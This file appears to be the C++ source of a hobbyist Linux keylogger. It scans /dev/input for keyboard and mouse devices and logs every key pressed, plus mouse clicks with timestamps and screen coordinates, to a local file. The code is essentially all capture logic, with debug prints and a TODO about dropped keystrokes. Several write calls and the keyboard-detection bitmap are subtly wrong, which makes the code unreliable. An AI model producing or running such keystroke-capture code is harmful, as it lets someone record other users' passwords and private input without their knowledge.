#include <iostream>
#include <fstream>
#include <sys/stat.h>
#include <sys/dir.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <string>
#include <dirent.h>
#include <fcntl.h>
#include <signal.h>
#include <unistd.h>
#include <linux/input.h>
#include <string.h>
#include <X11/Xlib.h>

#define NUM_KEYCODES 71

using namespace std;

// Create a keylogger that reads raw binary input from the keyboard and logs it into a log file
// If possible, use the pre-defined keylogger.c to not re-invent the wheel
// usage: ./keylogger output_log.txt <-- the output file to store the logged data

const char * keycodes[] = {
    "RESERVED",
    "ESC",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "0",
    "MINUS",
    "EQUAL",
    "BACKSPACE",
    "TAB",
    "Q",
    "W",
    "E",
    "R",
    "T",
    "Y",
    "U",
    "I",
    "O",
    "P",
    "LEFTBRACE",
    "RIGHTBRACE",
    "ENTER",
    "LEFTCTRL",
    "A",
    "S",
    "D",
    "F",
    "G",
    "H",
    "J",
    "K",
    "L",
    "SEMICOLON",
    "APOSTROPHE",
    "GRAVE",
    "LEFTSHIFT",
    "BACKSLASH",
    "Z",
    "X",
    "C",
    "V",
    "B",
    "N",
    "M",
    "COMMA",
    "DOT",
    "SLASH",
    "RIGHTSHIFT",
    "KPASTERISK",
    "LEFTALT",
    "SPACE",
    "CAPSLOCK",
    "F1",
    "F2",
    "F3",
    "F4",
    "F5",
    "F6",
    "F7",
    "F8",
    "F9",
    "F10",
    "NUMLOCK",
    "SCROLLLOCK"
};

void show_usage_and_exit(char* char_pt){
    fprintf(stderr, "Usage: %s output_file\n", char_pt);
    exit(1);
}

int write_all(int file_desc, const char * str){
    int bytesWritten = 0;
    int bytesToWrite = strlen(str) + 1;

    do {
        bytesWritten = write(file_desc, str, bytesToWrite);

        if(bytesWritten == -1){
            return 0;
        }
        bytesToWrite -= bytesWritten;
        str += bytesWritten;
    } while(bytesToWrite > 0);

    return 1;
}

void write_to_out(int outfd, const char * str, int keyboard_fd){
    if (!write_all(outfd, str)){
        close(outfd);
        close(keyboard_fd);
        perror("write");
        exit(1);
    }
}

void keylogger_init(int keyboard_fd, int mouse_fd,  int outfd){




    // TODO: THE THING THAT IS HAPPENING NOW IS THAT SOME OF THE KEYSTROKES ARE LOST IN THE PROCESS. 
    // THAT WOULD ALSO SOLVE THE PROBLEM OF HAVING SOME CLICK DATA GO OFF THE FILE
    // BECAUSE SIMILARLY, SOME OF THE TYPE DATA IS ALSO NOT RECORDED IN THE OUTPUT FILE




    // keyboard variables
    int event_size = sizeof(struct input_event);
    int kbd_bytes_read = 0;
    int mouse_bytes_read = 0;
    struct input_event events[128]; // replace 128 with NUM_EVENTS
    struct input_event mouse_events[128];
    int i;

    // mouse variables
    Display *dpy;
    Window root, child;
    int rootX, rootY, winX, winY;
    unsigned int mask;

    dpy = XOpenDisplay(NULL);
    XQueryPointer(dpy, DefaultRootWindow(dpy), &root, &child, &rootX, &rootY, &winX, &winY
    , &mask);


    while(true){
        kbd_bytes_read = read(keyboard_fd, events, event_size * 128);

        // capturing the keyboard output
        for (int i = 0; i < (kbd_bytes_read/event_size); ++i){
            if (events[i].type == EV_KEY){
                if (events[i].value == 1){
                    if (events[i].code > 0 && events[i].code < NUM_KEYCODES){
                        write_to_out(outfd, keycodes[events[i].code], keyboard_fd);
                        write_to_out(outfd, "\n", keyboard_fd);
                    } else {
                        write(outfd, "UNRECOGNIZED\n", sizeof("UNRECOGNIZED\n"));
                    }
                }
            }
        }


        // capturing the mouse output
        int mouse_bytes_read = read(mouse_fd, mouse_events, event_size * 128);

        for (int i = 0; i < (mouse_bytes_read/event_size); ++i){
            // printf("the mouse event type is %d\n", mouse_events[i].type);
            if (mouse_events[i].type == 0){
                if (mouse_events[i].code == 0){
                    XQueryPointer(dpy,DefaultRootWindow(dpy),&root,&child,&rootX,&rootY,&winX,&winY,&mask);
                }
                else if (mouse_events[i].code == 1){
                    XQueryPointer(dpy,DefaultRootWindow(dpy),&root,&child,&rootX,&rootY,&winX,&winY,&mask);
                }
                //char announcement[100] = {'\0'};
               // sprintf(announcement, "time%ld.%06ld\tx %d\ty %d\n", mouse_events[i].time.tv_sec, mouse_events[i].time.tv_usec, rootX, rootY);
                //write(outfd, announcement, sizeof(announcement));
            } else if (mouse_events[i].type == 1){
                if (mouse_events[i].code == 272){
                    XQueryPointer(dpy,DefaultRootWindow(dpy),&root,&child,&rootX,&rootY,&winX,&winY,&mask);
                    write(outfd, "MOUSE BUTTON ", sizeof("MOUSE BUTTON "));
                    if (mouse_events[i].value == 0){
                        write(outfd, "RELEASED\n", sizeof("RELEASED\n"));
                    } 
                    else if (mouse_events[i].value == 1){
                        write(outfd, "PRESSED\n", sizeof("PRESSED\n"));
                    }
                    char announcement[100] = {'\0'};
                    sprintf(announcement, "time%ld.%06ld\tx %d\ty %d\n", mouse_events[i].time.tv_sec, mouse_events[i].time.tv_usec, rootX, rootY);
                    write(outfd, announcement, sizeof(announcement));
                    fsync(outfd);
                }
            }
        }



    }
    if ((kbd_bytes_read > 0)){
        write(outfd, "\n", keyboard_fd);
        fsync(outfd);
    }
}

int is_keyboard_device(const struct dirent * file){
    struct stat filestat;
    char filename[512];

    snprintf(filename, sizeof(filename), "%s%s", "/dev/input/", file->d_name);

    int error = stat(filename, &filestat);
    if (error){
        return 0;
    }
    return S_ISCHR(filestat.st_mode);
}

int is_mouse_device(const struct dirent * file){
    struct stat filestat;
    char filename[512];

    snprintf(filename, sizeof(filename), "%s%s", "/dev/input/", file->d_name);

    int error = stat(filename, &filestat);
    if (error){
        return 0;
    }
    return S_ISCHR(filestat.st_mode);
}

char * obtain_mouse_event_file(){
    char * mouse_file = NULL;
    struct dirent ** event_files;
    char filename[512];

    int num = scandir("/dev/input/", &event_files, &is_mouse_device, &alphasort); 
    if (num < 0){
        return NULL;
    } else {
        for (int i = 0; i < num; i++){
            int32_t event_bitmap = 0;
            int fd;
            int32_t mouse_bitmap = BTN_LEFT | BTN_RIGHT; // BTN_MOUSE;

            printf("here\n");

            snprintf(filename, sizeof(filename), "%s%s", "/dev/input/", event_files[i]->d_name);
            printf("%s\n", filename);
            
            int mouse_fd = open(filename,O_RDONLY);

            printf("got here\n");

            if (mouse_fd < 0){
                perror("open");
                continue;
            }

            ioctl(mouse_fd, EVIOCGBIT(0, sizeof(event_bitmap)), &event_bitmap);
            printf("got here too lmao and event bitmap is %d\n", event_bitmap);
            if ((EV_ABS & event_bitmap) == EV_ABS){
                // behaves like a mouse
                ioctl(mouse_fd, EVIOCGBIT(EV_ABS, sizeof(event_bitmap)), &event_bitmap);
                printf("got to here my lad\n");
                printf("mouse bitmap: %d; event bitmap: %d\n", mouse_bitmap, event_bitmap);
                if ((mouse_bitmap & event_bitmap) == mouse_bitmap){
                    // device supports left click and right click so its probably a mouse
                    printf("GOTTEM YEAAAA WOOO \n");
                    mouse_file = strdup(filename);
                    close(mouse_fd);
                    break;
                }
            }

            close(mouse_fd);
        }
    }
    for (int i = 0; i < num; i++){
        free(event_files[i]);
    }
    free(event_files);
    return mouse_file;
}

char * obtain_keyboard_event_file(){
    char * keyboard_file = NULL;
    struct dirent ** event_files;
    char filename[512];

    int num = scandir("/dev/input/", &event_files, &is_keyboard_device, &alphasort); 
    if (num < 0){
        return NULL;
    } else {
        for (int i = 0; i < num; i++){
            int32_t event_bitmap = 0;
            int fd;
            int32_t keyboard_bitmap = KEY_A | KEY_B | KEY_C | KEY_Z;

            snprintf(filename, sizeof(filename), "%s%s", "/dev/input/", event_files[i]->d_name);
            
            int keyboard_fd = open(filename,O_RDONLY);

            if (keyboard_fd < 0){
                perror("open");
                continue;
            }

            ioctl(keyboard_fd, EVIOCGBIT(0, sizeof(event_bitmap)), &event_bitmap);
            if ((EV_KEY & event_bitmap) == EV_KEY){
                // behaves like a keyboard
                ioctl(keyboard_fd, EVIOCGBIT(EV_KEY, sizeof(event_bitmap)), &event_bitmap);
                if ((keyboard_bitmap & event_bitmap) == keyboard_bitmap){
                    // device supports A, B, C, Z, so its probably a keyboard
                    keyboard_file = strdup(filename);
                    close(keyboard_fd);
                    break;
                }
            }

            close(keyboard_fd);
        }
    }
    for (int i = 0; i < num; i++){
        free(event_files[i]);
    }
    free(event_files);
    return keyboard_file;
}

int main(int argc, char ** argv){
    //check usage
    if (argc < 2){
        show_usage_and_exit(argv[0]);
    }

    //check /dev/input directory for the keyboard input file
    char * keyboard_device = obtain_keyboard_event_file();
    printf("keyboard file: %s\n", keyboard_device);
    if (keyboard_device == NULL){
        fprintf(stderr, "Error: Keyboard device not found.");
        exit(1);
    }

    const char * mouse_device = "/dev/input/event5";//obtain_mouse_event_file();  MALLOC THIS MAYBE
    if (mouse_device == NULL){
        fprintf(stderr, "Error: Mouse device not found.");
        exit(1);
    }
    printf("mouse file: %s\n", mouse_device);

    int output_fd = open(argv[1], O_WRONLY|O_APPEND|O_CREAT, S_IROTH);
    if (output_fd < 0){
        perror("output file: open");
    }

    int keyboard_fd = open(keyboard_device, O_RDONLY);
    if (keyboard_fd < 0){
        perror("keyboard file: open");
    }

    int mouse_fd = open(mouse_device, O_RDONLY);
    if (mouse_fd < 0){
        perror("mouse file: open");
    }

    keylogger_init(keyboard_fd, mouse_fd, output_fd);

    close(keyboard_fd);
    close(mouse_fd);
    close(output_fd);
    free(keyboard_device);

    return 0;


}